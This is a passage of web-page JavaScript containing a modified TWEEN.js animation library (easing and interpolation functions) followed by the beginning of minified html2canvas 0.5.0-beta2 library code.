// Otherwise, use 'new Date().getTime()'.
else {
	TWEEN.now = function () {
		return new Date().getTime();
	};
}


TWEEN.Tween = function (object) {

	var _object = null;
	if(object) _object = object;


	var _duration = 1000;
	var _time = 0;
	var _startTime = null;

	var _reversed = false;
	this.isPlaying = false;

	
	var _easingFunction = TWEEN.Easing.Linear.None;
	var _interpolationFunction = TWEEN.Interpolation.Linear;


	var _valuesStartOrigin = null;
	var _valuesEndOrigin = null;
	var _valuesStart = {};
	var _valuesEnd = {};

	

	var _isReset = true;



	var _deltas = {};
	var _deltas_init = {};

	var _onCompleteCallback = null;
	var _onCompleteCallbackScope = null;
	var _onReverseCompleteCallback = null;
	var _onReverseCompleteCallbackScope = null;

	
	this.setObject = function (object) {
		if(object)
			_object = object;
	};

	//Computes new deltas to tween to
	this.to = function (properties, duration) {
		_isReset = true;
		if (duration !== undefined) {
			_duration = duration;
		}

		var property, start=0, end=0;
		for (property in properties)
		{
			if (_object[property] === undefined) {
				continue;
			}

			start = _object[property];
			end = properties[property];
			_deltas[property] = end - start;
			_deltas_init[property] = _deltas[property];
		}

		return this;
	};


	this.reverse = function () {

		var property;
		
		if(this.isPlaying){
			this.isPlaying = false;
			for (property in _deltas) {
				if(_reversed){
					_deltas[property] = (1-_value)*_deltas[property];
				}else{
					_deltas[property] = _deltas_init[property]-(1-_value)*_deltas[property];
				}
			}

			if(_reversed){
				//console.log("start reverse, currently playing, reverse");
			}else{
				//console.log("start reverse, currently playing, no reverse");
			}
		}else{
			//console.log("start reverse, currently not playing; ");
			for (property in _deltas)
			{
				_deltas[property] = _deltas_init[property];
			}
		}

		_isReset = false;
		_prevValue = 0;
		_reversed = true;
		_time = TWEEN.now();
		_startTime = TWEEN.now();
		this.isPlaying = true;


		return this;
	};

	this.start = function (time) {
		var property;
		
		
		if(this.isPlaying){
			this.isPlaying = false;
			
			if(!_isReset){
				for (property in _deltas) {
					if(_reversed){
						_deltas[property] = _deltas_init[property]-(1-_value)*_deltas[property];
					}else{
						_deltas[property] = (1-_value)*_deltas[property];
					}
				}
			}


			if(_reversed){
				//console.log("start, currently playing, reverse");
			}else{
				//console.log("start, currently playing, no reverse");
			}
		}else{
			//console.log("start, currently not playing; ");
			for (property in _deltas)
			{
				_deltas[property] = _deltas_init[property];
			}
		}


		
		_isReset = false;
		_reversed = false;
		_prevValue = 0;
		_time = TWEEN.now();
		_startTime = _time;
		this.isPlaying = true;

		
		return this;
	};


	
	
	var _value = 0; //from 0 to 1 ; output of the tween function
	var _dvalue = 0; //delta _value and the one of the previous dt
	var _prevValue = 0; //_value of the previous dt

	this.update = function (dt) {

		var property;
		var elapsed; //% of the duration; from 0 to 1;

		_time = _time + dt;
		if (_time < _startTime) {
			return true;
		}
		elapsed = (_time - _startTime) / _duration;
		elapsed = elapsed > 1 ? 1 : elapsed;


		_value = _easingFunction(elapsed);
		_dvalue = _value - _prevValue;
		_prevValue = _value;
		
		var dv = 0;

		for (property in _deltas) {
			if(_reversed){
				_object[property] += -_dvalue*_deltas[property];
			}else{
				_object[property] += _dvalue*_deltas[property];	
			}
			

			/*_object[property] = start + dValues[property] * value;
			dv = (start + (end - start) * value) - _object[property];*/
		}



		if (elapsed === 1) {
			if (_onCompleteCallback !== null && !_reversed) {
				if(_onCompleteCallbackScope!=null){
					_onCompleteCallback.call(_onCompleteCallbackScope);
				}else{
					_onCompleteCallback.call(_object, _object);	
				}
				
			}

			if ((_onReverseCompleteCallback !== null) && _reversed) {
				if(_onReverseCompleteCallbackScope!=null){
					_onReverseCompleteCallback.call(_onReverseCompleteCallbackScope);
				}else{
					_onReverseCompleteCallback.call(_object, _object);
				}
			}

			this.isPlaying = false;
			return false;
		}

		return true;

	};






	this.onComplete = function (callback,scope) {
		_onCompleteCallback = callback;
		_onCompleteCallbackScope = scope;
		return this;
	};

	this.onReverseComplete = function (callback,scope) {

		_onReverseCompleteCallback = callback;
		_onReverseCompleteCallbackScope = scope;
		return this;

	};


	this.easing = function (easing) {

		_easingFunction = easing;
		return this;

	};

	this.interpolation = function (interpolation) {

		_interpolationFunction = interpolation;
		return this;

	};

};

TWEEN.Easing = {

	Linear: {

		None: function (k) {

			return k;

		}

	},

	Quadratic: {

		In: function (k) {

			return k * k;

		},

		Out: function (k) {

			return k * (2 - k);

		},

		InOut: function (k) {

			if ((k *= 2) < 1) {
				return 0.5 * k * k;
			}

			return - 0.5 * (--k * (k - 2) - 1);

		}

	},

	Cubic: {

		In: function (k) {

			return k * k * k;

		},

		Out: function (k) {

			return --k * k * k + 1;

		},

		InOut: function (k) {

			if ((k *= 2) < 1) {
				return 0.5 * k * k * k;
			}

			return 0.5 * ((k -= 2) * k * k + 2);

		}

	},

	Quartic: {

		In: function (k) {

			return k * k * k * k;

		},

		Out: function (k) {

			return 1 - (--k * k * k * k);

		},

		InOut: function (k) {

			if ((k *= 2) < 1) {
				return 0.5 * k * k * k * k;
			}

			return - 0.5 * ((k -= 2) * k * k * k - 2);

		}

	},

	Quintic: {

		In: function (k) {

			return k * k * k * k * k;

		},

		Out: function (k) {

			return --k * k * k * k * k + 1;

		},

		InOut: function (k) {

			if ((k *= 2) < 1) {
				return 0.5 * k * k * k * k * k;
			}

			return 0.5 * ((k -= 2) * k * k * k * k + 2);

		}

	},

	Sinusoidal: {

		In: function (k) {

			return 1 - Math.cos(k * Math.PI / 2);

		},

		Out: function (k) {

			return Math.sin(k * Math.PI / 2);

		},

		InOut: function (k) {

			return 0.5 * (1 - Math.cos(Math.PI * k));

		}

	},

	Exponential: {

		In: function (k) {

			return k === 0 ? 0 : Math.pow(1024, k - 1);

		},

		Out: function (k) {

			return k === 1 ? 1 : 1 - Math.pow(2, - 10 * k);

		},

		InOut: function (k) {

			if (k === 0) {
				return 0;
			}

			if (k === 1) {
				return 1;
			}

			if ((k *= 2) < 1) {
				return 0.5 * Math.pow(1024, k - 1);
			}

			return 0.5 * (- Math.pow(2, - 10 * (k - 1)) + 2);

		}

	},

	Circular: {

		In: function (k) {

			return 1 - Math.sqrt(1 - k * k);

		},

		Out: function (k) {

			return Math.sqrt(1 - (--k * k));

		},

		InOut: function (k) {

			if ((k *= 2) < 1) {
				return - 0.5 * (Math.sqrt(1 - k * k) - 1);
			}

			return 0.5 * (Math.sqrt(1 - (k -= 2) * k) + 1);

		}

	},

	Elastic: {

		In: function (k) {

			if (k === 0) {
				return 0;
			}

			if (k === 1) {
				return 1;
			}

			return -Math.pow(2, 10 * (k - 1)) * Math.sin((k - 1.1) * 5 * Math.PI);

		},

		Out: function (k) {

			if (k === 0) {
				return 0;
			}

			if (k === 1) {
				return 1;
			}

			return Math.pow(2, -10 * k) * Math.sin((k - 0.1) * 5 * Math.PI) + 1;

		},

		InOut: function (k) {

			if (k === 0) {
				return 0;
			}

			if (k === 1) {
				return 1;
			}

			k *= 2;

			if (k < 1) {
				return -0.5 * Math.pow(2, 10 * (k - 1)) * Math.sin((k - 1.1) * 5 * Math.PI);
			}

			return 0.5 * Math.pow(2, -10 * (k - 1)) * Math.sin((k - 1.1) * 5 * Math.PI) + 1;

		}

	},

	Back: {

		In: function (k) {

			var s = 1.70158;

			return k * k * ((s + 1) * k - s);

		},

		Out: function (k) {

			var s = 1.70158;

			return --k * k * ((s + 1) * k + s) + 1;

		},

		InOut: function (k) {

			var s = 1.70158 * 1.525;

			if ((k *= 2) < 1) {
				return 0.5 * (k * k * ((s + 1) * k - s));
			}

			return 0.5 * ((k -= 2) * k * ((s + 1) * k + s) + 2);

		}

	},

	Bounce: {

		In: function (k) {

			return 1 - TWEEN.Easing.Bounce.Out(1 - k);

		},

		Out: function (k) {

			if (k < (1 / 2.75)) {
				return 7.5625 * k * k;
			} else if (k < (2 / 2.75)) {
				return 7.5625 * (k -= (1.5 / 2.75)) * k + 0.75;
			} else if (k < (2.5 / 2.75)) {
				return 7.5625 * (k -= (2.25 / 2.75)) * k + 0.9375;
			} else {
				return 7.5625 * (k -= (2.625 / 2.75)) * k + 0.984375;
			}

		},

		InOut: function (k) {

			if (k < 0.5) {
				return TWEEN.Easing.Bounce.In(k * 2) * 0.5;
			}

			return TWEEN.Easing.Bounce.Out(k * 2 - 1) * 0.5 + 0.5;

		}

	}

};

TWEEN.Interpolation = {

	Linear: function (v, k) {

		var m = v.length - 1;
		var f = m * k;
		var i = Math.floor(f);
		var fn = TWEEN.Interpolation.Utils.Linear;

		if (k < 0) {
			return fn(v[0], v[1], f);
		}

		if (k > 1) {
			return fn(v[m], v[m - 1], m - f);
		}

		return fn(v[i], v[i + 1 > m ? m : i + 1], f - i);

	},

	Bezier: function (v, k) {

		var b = 0;
		var n = v.length - 1;
		var pw = Math.pow;
		var bn = TWEEN.Interpolation.Utils.Bernstein;

		for (var i = 0; i <= n; i++) {
			b += pw(1 - k, n - i) * pw(k, i) * v[i] * bn(n, i);
		}

		return b;

	},

	CatmullRom: function (v, k) {

		var m = v.length - 1;
		var f = m * k;
		var i = Math.floor(f);
		var fn = TWEEN.Interpolation.Utils.CatmullRom;

		if (v[0] === v[m]) {

			if (k < 0) {
				i = Math.floor(f = m * (1 + k));
			}

			return fn(v[(i - 1 + m) % m], v[i], v[(i + 1) % m], v[(i + 2) % m], f - i);

		} else {

			if (k < 0) {
				return v[0] - (fn(v[0], v[0], v[1], v[1], -f) - v[0]);
			}

			if (k > 1) {
				return v[m] - (fn(v[m], v[m], v[m - 1], v[m - 1], f - m) - v[m]);
			}

			return fn(v[i ? i - 1 : 0], v[i], v[m < i + 1 ? m : i + 1], v[m < i + 2 ? m : i + 2], f - i);

		}

	},

	Utils: {

		Linear: function (p0, p1, t) {

			return (p1 - p0) * t + p0;

		},

		Bernstein: function (n, i) {

			var fc = TWEEN.Interpolation.Utils.Factorial;

			return fc(n) / fc(i) / fc(n - i);

		},

		Factorial: (function () {

			var a = [1];

			return function (n) {

				var s = 1;

				if (a[n]) {
					return a[n];
				}

				for (var i = n; i > 1; i--) {
					s *= i;
				}

				a[n] = s;
				return s;

			};

		})(),

		CatmullRom: function (p0, p1, p2, p3, t) {

			var v0 = (p2 - p0) * 0.5;
			var v1 = (p3 - p1) * 0.5;
			var t2 = t * t;
			var t3 = t * t2;

			return (2 * p1 - 2 * p2 + v0 + v1) * t3 + (- 3 * p1 + 3 * p2 - 2 * v0 - v1) * t2 + v0 * t + p1;

		}

	}

};

// UMD (Universal Module Definition)
(function (root) {

	if (typeof define === 'function' && define.amd) {

		// AMD
		define([], function () {
			return TWEEN;
		});

	} else if (typeof module !== 'undefined' && typeof exports === 'object') {

		// Node.js
		module.exports = TWEEN;

	} else if (root !== undefined) {

		// Global variable
		root.TWEEN = TWEEN;

	}

})(this);</script>
	<script>/*
  html2canvas 0.5.0-beta2 <http://html2canvas.hertzen.com>
  Copyright (c) 2015 Niklas von Hertzen

  Released under  License
*/
!function(a){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=a();else if("function"==typeof define&&define.amd)define([],a);else{var b;b="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,b.html2canvas=a()}}(function(){var a;return function b(a,c,d){function e(g,h){if(!c[g]){if(!a[g]){var i="function"==typeof require&&require;if(!h&&i)return i(g,!0);if(f)return f(g,!0);var j=new Error("Cannot find module '"+g+"'");throw j.code="MODULE_NOT_FOUND",j}var k=c[g]={exports:{}};a[g][0].call(k.exports,function(b){var c=a[g][1][b];return e(c?c:b)},k,k.exports,b,a,c,d)}return c[g].exports}for(var f="function"==typeof require&&require,g=0;g<d.length;g++)e(d[g]);return e}({1:[function(b,c,d){(function(b){!function(e){function f(a){throw RangeError(I[a])}function g(a,b){for(var c=a.length,d=[];c--;)d[c]=b(a[c]);return d}function h(a,b){var c=a.split("@"),d="";c.length>1&&(d=c[0]+"@",a=c[1]),a=a.replace(H,".");var e=a.split("."),f=g(e,b).join(".");return d+f}function i(a){for(var b,c,d=[],e=0,f=a.length;f>e;)b=a.charCodeAt(e++),b>=55296&&56319>=b&&f>e?(c=a.charCodeAt(e++),56320==(64512&c)?d.push(((1023&b)<<10)+(1023&c)+65536):(d.push(b),e--)):d.push(b);return d}function j(a){return g(a,function(a){var b="";return a>65535&&(a-=65536,b+=L(a>>>10&1023|55296),a=56320|1023&a),b+=L(a)}).join("")}function k(a){return 10>a-48?a-22:26>a-65?a-65:26>a-97?a-97:x}function l(a,b){return a+22+75*(26>a)-((0!=b)<<5)}function m(a,b,c){var d=0;for(a=c?K(a/B):a>>1,a+=K(a/b);a>J*z>>1;d+=x)a=K(a/J);return K(d+(J+1)*a/(a+A))}function n(a){var b,c,d,e,g,h,i,l,n,o,p=[],q=a.length,r=0,s=D,t=C;for(c=a.lastIndexOf(E),0>c&&(c=0),d=0;c>d;++d)a.charCodeAt(d)>=128&&f("not-basic"),p.push(a.charCodeAt(d));for(e=c>0?c+1:0;q>e;){for(g=r,h=1,i=x;e>=q&&f("invalid-input"),l=k(a.charCodeAt(e++)),(l>=x||l>K((w-r)/h))&&f("overflow"),r+=l*h,n=t>=i?y:i>=t+z?z:i-t,!(n>l);i+=x)o=x-n,h>K(w/o)&&f("overflow"),h*=o;b=p.length+1,t=m(r-g,b,0==g),K(r/b)>w-s&&f("overflow"),s+=K(r/b),r%=b,p.splice(r++,0,s)}return j(p)}function o(a){var b,c,d,e,g,h,j,k,n,o,p,q,r,s,t,u=[];for(a=i(a),q=a.length,b=D,c=0,g=C,h=0;q>h;++h)p=a[h],128>p&&u.push(L(p));for(d=e=u.length,e&&u.push(E);q>d;){for(j=w,h=0;q>h;++h)p=a[h],p>=b&&j>p&&(j=p);for(r=d+1,j-b>K((w-c)/r)&&f("overflow"),c+=(j-b)*r,b=j,h=0;q>h;++h)if(p=a[h],b>p&&++c>w&&f("overflow"),p==b){for(k=c,n=x;o=g>=n?y:n>=g+z?z:n-g,!(o>k);n+=x)t=k-o,s=x-o,u.push(L(l(o+t%s,0))),k=K(t/s);u.push(L(l(k,0))),g=m(c,r,d==e),c=0,++d}++c,++b}return u.join("")}function p(a){return h(a,function(a){return F.test(a)?n(a.slice(4).toLowerCase()):a})}function q(a){return h(a,function(a){return G.test(a)?"xn--"+o(a):a})}var r="object"==typeof d&&d&&!d.nodeType&&d,s="object"==typeof c&&c&&!c.nodeType&&c,t="object"==typeof b&&b;(t.global===t||t.window===t||t.self===t)&&(e=t);var u,v,w=2147483647,x=36,y=1,z=26,A=38,B=700,C=72,D=128,E="-",F=/^xn--/,G=/[^\x20-\x7E]/,H=/[\x2E\u3002\uFF0E\uFF61]/g,I={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},J=x-y,K=Math.floor,L=String.fromCharCode;if(u={version:"1.3.2",ucs2:{decode:i,encode:j},decode:n,encode:o,toASCII:q,toUnicode:p},"function"==typeof a&&"object"==typeof a.amd&&a.amd)a("punycode",function(){return u});else if(r&&s)if(c.exports==r)s.exports=u;else for(v in u)u.hasOwnProperty(v)&&(r[v]=u[v]);else e.punycode=u}(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],2:[function(a,b,c){function d(a,b,c){!a.defaultView||b===a.defaultView.pageXOffset&&c===a.defaultView.pageYOffset||a.defaultView.scrollTo(b,c)}function e(a,b){try{b&&(b.width=a.width,b.height=a.height,b.getContext("2d").putImageData(a.getContext("2d").getImageData(0,0,a.width,a.height),0,0))}catch(c){h("Unable to copy canvas content from",a,c)}}function f(a,b){for(var c=3===a.nodeType?document.createTextNode(a.nodeValue):a.cloneNode(!1),d=a.firstChild;d;)(b===!0||1!==d.nodeType||"SCRIPT"!==d.nodeName)&&c.appendChild(f(d,b)),d=d.nextSibling;return 1===a.nodeType&&(c._scrollTop=a.scrollTop,c._scrollLeft=a.scrollLeft,"CANVAS"===a.nodeName?e(a,c):("TEXTAREA"===a.nodeName||"SELECT"===a.nodeName)&&(c.value=a.value)),c}function g(a){if(1===a.nodeType){a.scrollTop=a._scrollTop,a.scrollLeft=a._scrollLeft;for(var b=a.firstChild;b;)g(b),b=b.nextSibling}}var h=a("./log");b.exports=function(a,b,c,e,h,i,j){var k=f(a.documentElement,h.javascriptEnabled),l=b.createElement("iframe");return l.className="html2canvas-container",l.style.visibility="hidden",l.style.position="fixed",l.style.left="-10000px",l.style.top="0px",l.style.border="0",l.width=c,l.height=e,l.scrolling="no",b.body.appendChild(l),new Promise(function(b){var c=l.contentWindow.document;l.contentWindow.onload=l.onload=function(){var a=setInterval(function(){c.body.childNodes.length>0&&(g(c.documentElement),clearInterval(a),"view"===h.type&&(l.contentWindow.scrollTo(i,j),!/(iPad|iPhone|iPod)/g.test(navigator.userAgent)||l.contentWindow.scrollY===j&&l.contentWindow.scrollX===i||(c.documentElement.style.top=-j+"px",c.documentElement.style.left=-i+"px",c.documentElement.style.position="absolute")),b(l))},50)},c.open(),c.write("<!DOCTYPE html><html></html>"),d(a,i,j),c.replaceChild(c.adoptNode(k),c.documentElement),c.close()})}},{"./log":13}],3:[function(a,b,c){function d(a){this.r=0,this.g=0,this.b=0,this.a=null;this.fromArray(a)||this.namedColor(a)||this.rgb(a)||this.rgba(a)||this.hex6(a)||this.hex3(a)}d.prototype.darken=function(a){var b=1-a;return new d([Math.round(this.r*b),Math.round(this.g*b),Math.round(this.b*b),this.a])},d.prototype.isTransparent=function(){return 0===this.a},d.prototype.isBlack=function(){return 0===this.r&&0===this.g&&0===this.b},d.prototype.fromArray=function(a){return Array.isArray(a)&&(this.r=Math.min(a[0],255),this.g=Math.min(a[1],255),this.b=Math.min(a[2],255),a.length>3&&(this.a=a[3])),Array.isArray(a)};var e=/^#([a-f0-9]{3})$/i;d.prototype.hex3=function(a){var b=null;return null!==(b=a.match(e))&&(this.r=parseInt(b[1][0]+b[1][0],16),this.g=parseInt(b[1][1]+b[1][1],16),this.b=parseInt(b[1][2]+b[1][2],16)),null!==b};var f=/^#([a-f0-9]{6})$/i;d.prototype.hex6=function(a){var b=null;return null!==(b=a.match(f))&&(this.r=parseInt(b[1].substring(0,2),16),this.g=parseInt(b[1].substring(2,4),16),this.b=parseInt(b[1].substring(4,6),16)),null!==b};var g=/^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/;d.prototype.rgb=function(a){var b=null;return null!==(b=a.match(g))&&(this.r=Number(b[1]),this.g=Number(b[2]),this.b=Number(b[3])),null!==b};var h=/^rgba\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d?\.?\d+)\s*\)$/;d.prototype.rgba=function(a){var b=null;return null!==(b=a.match(h))&&(this.r=Number(b[1]),this.g=Number(b[2]),this.b=Number(b[3]),this.a=Number(b[4])),null!==b},d.prototype.toString=function(){return null!==this.a&&1!==this.a?"rgba("+[this.r,this.g,this.b,this.a].join(",")+")":"rgb("+[this.r,this.g,this.b].join(",")+")"},d.prototype.namedColor=function(a){a=a.toLowerCase();var b=i[a];if(b)this.r=b[0],this.g=b[1],this.b=b[2];else if("transparent"===a)return this.r=this.g=this.b=this.a=0,!0;return!!b},d.prototype.isColor=!0;var i={aliceblue:[240,248,255],antiquewhite:[250,235,215],aqua:[0,255,255],aquamarine:[127,255,212],azure:[240,255,255],beige:[245,245,220],bisque:[255,228,196],black:[0,0,0],blanchedalmond:[255,235,205],blue:[0,0,255],blueviolet:[138,43,226],brown:[165,42,42],burlywood:[222,184,135],cadetblue:[95,158,160],chartreuse:[127,255,0],chocolate:[210,105,30],coral:[255,127,80],cornflowerblue:[100,149,237],cornsilk:[255,248,220],crimson:[220,20,60],cyan:[0,255,255],darkblue:[0,0,139],darkcyan:[0,139,139],darkgoldenrod:[184,134,11],darkgray:[169,169,169],darkgreen:[0,100,0],darkgrey:[169,169,169],darkkhaki:[189,183,107],darkmagenta:[139,0,139],darkolivegreen:[85,107,47],darkorange:[255,140,0],darkorchid:[153,50,204],darkred:[139,0,0],darksalmon:[233,150,122],darkseagreen:[143,188,143],darkslateblue:[72,61,139],darkslategray:[47,79,79],darkslategrey:[47,79,79],darkturquoise:[0,206,209],darkviolet:[148,0,211],deeppink:[255,20,147],deepskyblue:[0,191,255],dimgray:[105,105,105],dimgrey:[105,105,105],dodgerblue:[30,144,255],firebrick:[178,34,34],floralwhite:[255,250,240],forestgreen:[34,139,34],fuchsia:[255,0,255],gainsboro:[220,220,220],ghostwhite:[248,248,255],gold:[255,215,0],goldenrod:[218,165,32],gray:[128,128,128],green:[0,128,0],greenyellow:[173,255,47],grey:[128,128,128],honeydew:[240,255,240],hotpink:[255,105,180],indianred:[205,92,92],indigo:[75,0,130],ivory:[255,255,240],khaki:[240,230,140],lavender:[230,230,250],lavenderblush:[255,240,245],lawngreen:[124,252,0],lemonchiffon:[255,250,205],lightblue:[173,216,230],lightcoral:[240,128,128],lightcyan:[224,255,255],lightgoldenrodyellow:[250,250,210],lightgray:[211,211,211],lightgreen:[144,238,144],lightgrey:[211,211,211],lightpink:[255,182,193],lightsalmon:[255,160,122],lightseagreen:[32,178,170],lightskyblue:[135,206,250],lightslategray:[119,136,153],lightslategrey:[119,136,153],lightsteelblue:[176,196,222],lightyellow:[255,255,224],lime:[0,255,0],limegreen:[50,205,50],linen:[250,240,230],magenta:[255,0,255],maroon:[128,0,0],mediumaquamarine:[102,205,170],mediumblue:[0,0,205],mediumorchid:[186,85,211],mediumpurple:[147,112,219],mediumseagreen:[60,179,113],mediumslateblue:[123,104,238],mediumspringgreen:[0,250,154],mediumturquoise:[72,209,204],mediumvioletred:[199,21,133],midnightblue:[25,25,112],mintcream:[245,255,250],mistyrose:[255,228,225],moccasin:[255,228,181],navajowhite:[255,222,173],navy:[0,0,128],oldlace:[253,245,230],olive:[128,128,0],olivedrab:[107,142,35],orange:[255,165,0],orangered:[255,69,0],orchid:[218,112,214],palegoldenrod:[238,232,170],palegreen:[152,251,152],paleturquoise:[175,238,238],palevioletred:[219,112,147],papayawhip:[255,239,213],peachpuff:[255,218,185],peru:[205,133,63],pink:[255,192,203],plum:[221,160,221],powderblue:[176,224,230],purple:[128,0,128],rebeccapurple:[102,51,153],red:[255,0,0],rosybrown:[188,143,143],royalblue:[65,105,225],saddlebrown:[139,69,19],salmon:[250,128,114],sandybrown:[244,164,96],seagreen:[46,139,87],seashell:[255,245,238],sienna:[160,82,45],silver:[192,192,192],skyblue:[135,206,235],slateblue:[106,90,205],slategray:[112,128,144],slategrey:[112,128,144],snow:[255,250,250],springgreen:[0,255,127],steelblue:[70,130,180],tan:[210,180,140],teal:[0,128,128],thistle:[216,191,216],tomato:[255,99,71],turquoise:[64,224,208],violet:[238,130,238],wheat:[245,222,179],white:[255,255,255],whitesmoke:[245,245,245],yellow:[255,255,0],yellowgreen:[154,205,50]};b.exports=d},{}],4:[function(b,c,d){function e(a,b){var c=x++;if(b=b||{},b.logging&&(window.html2canvas.logging=!0,window.html2canvas.start=Date.now()),b.async="undefined"==typeof b.async?!0:b.async,b.allowTaint="undefined"==typeof b.allowTaint?!1:b.allowTaint,b.removeContainer="undefined"==typeof b.removeContainer?!0:b.removeContainer,b.javascriptEnabled="undefined"==typeof b.javascriptEnabled?!1:b.javascriptEnabled,b.imageTimeout="undefined"==typeof b.imageTimeout?1e4:b.imageTimeout,b.renderer="function"==typeof b.renderer?b.renderer:n,b.strict=!!b.strict,"string"==typeof a){if("string"!=typeof b.proxy)return Promise.reject("Proxy must be used when rendering url");var d=null!=b.width?b.width:window.innerWidth,e=null!=b.height?b.height:window.innerHeight;return u(l(a),b.proxy,document,d,e,b).then(function(a){return g(a.contentWindow.document.documentElement,a,b,d,e)})}var h=(void 0===a?[document.documentElement]:a.length?a:[a])[0];return h.setAttribute(w+c,c),f(h.ownerDocument,b,h.ownerDocument.defaultView.innerWidth,h.ownerDocument.defaultView.innerHeight,c).then(function(a){return"function"==typeof b.onrendered&&(r("options.onrendered is deprecated, html2canvas returns a Promise containing the canvas"),b.onrendered(a)),a})}function f(a,b,c,d,e){return t(a,a,c,d,b,a.defaultView.pageXOffset,a.defaultView.pageYOffset).then(function(f){r("Document cloned");var h=w+e,i="["+h+"='"+e+"']";a.querySelector(i).removeAttribute(h);var j=f.contentWindow,k=j.document.querySelector(i),l="function"==typeof b.onclone?Promise.resolve(b.onclone(j.document)):Promise.resolve(!0);return l.then(function(){return g(k,f,b,c,d)})})}function g(a,b,c,d,e){var f=b.contentWindow,g=new m(f.document),l=new o(c,g),n=v(a),q="view"===c.type?d:j(f.document),s="view"===c.type?e:k(f.document),t=new c.renderer(q,s,l,c,document),u=new p(a,t,g,l,c);return u.ready.then(function(){r("Finished rendering");var d;return d="view"===c.type?i(t.canvas,{width:t.canvas.width,height:t.canvas.height,top:0,left:0,x:0,y:0}):a===f.document.body||a===f.document.documentElement||null!=c.canvas?t.canvas:i(t.canvas,{width:null!=c.width?c.width:n.width,height:null!=c.height?c.height:n.height,top:n.top,left:n.left,x:f.pageXOffset,y:f.pageYOffset}),h(b,c),d})}function h(a,b){b.removeContainer&&(a.parentNode.removeChild(a),r("Cleaned up container"))}function i(a,b){var c=document.createElement("canvas"),d=Math.min(a.width-1,Math.max(0,b.left)),e=Math.min(a.width,Math.max(1,b.left+b.width)),f=Math.min(a.height-1,Math.max(0,b.top)),g=Math.min(a.height,Math.max(1,b.top+b.height));return c.width=b.width,c.height=b.height,r("Cropping canvas at:","left:",b.left,"top:",b.top,"width:",e-d,"height:",g-f),r("Resulting crop with width",b.width,"and height",b.height," with x",d,"and y",f),c.getContext("2d").drawImage(a,d,f,e-d,g-f,b.x,b.y,e-d,g-f),c}function j(a){return Math.max(Math.max(a.body.scrollWidth,a.documentElement.scrollWidth),Math.max(a.body.offsetWidth,a.documentElement.offsetWidth),Math.max(a.body.clientWidth,a.documentElement.clientWidth))}function k(a){return Math.max(Math.max(a.body.scrollHeight,a.documentElement.scrollHeight),Math.max(a.body.offsetHeight,a.documentElement.offsetHeight),Math.max(a.body.clientHeight,a.documentElement.clientHeight))}function l(a){var b=document.createElement("a");return b.href=a,b.href=b.href,b}var m=b("./support"),n=b("./renderers/canvas"),o=b("./imageloader"),p=b("./nodeparser"),q=b("./nodecontainer"),r=b("./log"),s=b("./utils"),t=b("./clone"),u=b("./proxy").loadUrlDocument,v=s.getBounds,w="data-html2canvas-node",x=0;e.CanvasRenderer=n,e.NodeContainer=q,e.log=r,e.utils=s;var y="undefined"==typeof document||"function"!=typeof Object.create||"function"!=typeof document.createElement("canvas").getContext?function(){return Promise.reject("No canvas support")}:e;c.exports=y,"function"==typeof a&&a.amd&&a("html2canvas",[],function(){return y})},{"./clone":2,"./imageloader":11,"./log":13,"./nodecontainer":14,"./nodeparser":15,"./proxy":16,"./renderers/canvas":20,"./support":22,"./utils":26}],5:[function(a,b,c){function d(a){if(this.src=a,e("DummyImageContainer for",a),!this.promise||!this.image){e("Initiating DummyImageContainer"),d.prototype.image=new Image;var b=this.image;d.prototype.promise=new Promise(function(a,c){b.onload=a,b.onerror=c,b.src=f(),b.complete===!0&&a(b)})}}var e=a("./log"),f=a("./utils").smallImage;b.exports=d},{"./log":13,"./utils":26}],6:[function(a,b,c){function d(a,b){var c,d,f=document.createElement("div"),g=document.createElement("img"),h=document.createElement("span"),i="Hidden Text";f.style.visibility="hidden",f.style.fontFamily=a,f.style.fontSize=b,f.style.margin=0,f.style.padding=0,document.body.appendChild(f),g.src=e(),g.width=1,g.height=1,g.style.margin=0,g.style.padding=0,g.style.verticalAlign="baseline",h.style.fontFamily=a,h.style.fontSize=b,h.style.margin=0,h.style.padding=0,h.appendChild(document.createTextNode(i)),f.appendChild(h),f.appendChild(g),c=g.offsetTop-h.offsetTop+1,f.removeChild(h),f.appendChild(document.createTextNode(i)),f.style.lineHeight="normal",g.style.verticalAlign="super",d=g.offsetTop-f.offsetTop+1,document.body.removeChild(f),this.baseline=c,this.lineWidth=1,this.middle=d}var e=a("./utils").smallImage;b.exports=d},{"./utils":26}],7:[function(a,b,c){function d(){this.data={}}var e=a("./font");d.prototype.getMetrics=function(a,b){return void 0===this.data[a+"-"+b]&&(this.data[a+"-"+b]=new e(a,b)),this.data[a+"-"+b]},b.exports=d},{"./font":6}],8:[function(a,b,c){function d(b,c,d){this.image=null,this.src=b;var e=this,g=f(b);this.promise=(c?new Promise(function(a){"about:blank"===b.contentWindow.document.URL||null==b.contentWindow.document.documentElement?b.contentWindow.onload=b.onload=function(){a(b)}:a(b)}):this.proxyLoad(d.proxy,g,d)).then(function(b){var c=a("./core");return c(b.contentWindow.document.documentElement,{type:"view",width:b.width,height:b.height,proxy:d.proxy,javascriptEnabled:d.javascriptEnabled,removeContainer:d.removeContainer,allowTaint:d.allowTaint,imageTimeout:d.imageTimeout/2})}).then(function(a){return e.image=a})}var e=a("./utils"),f=e.getBounds,g=a("./proxy").loadUrlDocument;d.prototype.proxyLoad=function(a,b,c){var d=this.src;return g(d.src,a,d.ownerDocument,b.width,b.height,c)},b.exports=d},{"./core":4,"./proxy":16,"./utils":26}],9:[function(a,b,c){function d(a){this.src=a.value,this.colorStops=[],this.type=null,this.x0=.5,this.y0=.5,this.x1=.5,this.y1=.5,this.promise=Promise.resolve(!0)}d.TYPES={LINEAR:1,RADIAL:2},d.REGEXP_COLORSTOP=/^\s*(rgba?\(\s*\d{1,3},\s*\d{1,3},\s*\d{1,3}(?:,\s*[0-9\.]+)?\s*\)|[a-z]{3,20}|#[a-f0-9]{3,6})(?:\s+(\d{1,3}(?:\.\d+)?)(%|px)?)?(?:\s|$)/i,b.exports=d},{}],10:[function(a,b,c){function d(a,b){this.src=a,this.image=new Image;var c=this;this.tainted=null,this.promise=new 